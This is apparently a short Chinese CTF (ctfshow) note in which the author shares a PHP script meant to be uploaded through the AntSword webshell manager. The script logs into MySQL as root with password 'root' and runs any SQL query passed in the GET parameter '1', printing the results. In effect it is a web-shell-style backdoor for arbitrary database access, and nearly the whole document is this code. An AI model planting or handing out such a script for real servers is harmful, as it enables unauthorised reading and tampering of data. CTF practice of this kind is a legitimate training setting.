自己写了个执行sql语句的东东，但确实不方便==（蚁剑传上去就行）

```
<?php    $dsn  = 'mysql:host=localhost;dbname=ctfshow';    $user = 'root';    $pwd  = 'root';    try{        $obj = new PDO($dsn,$user,$pwd);    }catch(PDOException $e){        echo 'Could not connect to DB:'.$e -> getMessage();    }    $sql = $_GET[1];    $res = $obj->prepare($sql);    $res->execute();    $result = $res->fetch(PDO::FETCH_ASSOC);    while ($row = $res -> fetch(PDO::FETCH_ASSOC)){        print_r($row);    }    ?>
```

